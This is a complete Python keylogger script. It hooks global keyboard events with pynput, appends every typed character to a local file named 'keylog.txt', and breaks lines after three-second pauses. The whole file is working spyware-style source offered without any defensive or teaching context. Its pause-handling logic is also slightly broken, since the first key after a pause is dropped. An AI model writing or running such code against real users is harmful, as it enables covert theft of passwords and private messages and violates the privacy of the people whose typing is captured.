from pynput import keyboard
import time

# The file to store the captured keys
output_file = "keylog.txt"

def create_on_press():
    last_key_time = time.time()
    newline_written = False  # Flag to track if a newline was written

    def on_press(key):
        nonlocal last_key_time, newline_written

        try:
            with open(output_file, "a") as f:
                current_time = time.time()
                time_diff = current_time - last_key_time

                if time_diff > 3 and not newline_written:
                    f.write("\n")
                    newline_written = True  # Set the flag to True after writing the newline

                if not newline_written:
                    f.write(key.char)

                last_key_time = current_time
                newline_written = False  # Reset the flag after writing the key

        except AttributeError:
            pass

    return on_press


# Initialize the listener
with keyboard.Listener(on_press=create_on_press()) as listener:
    # Run the listener in the background
    listener.join()
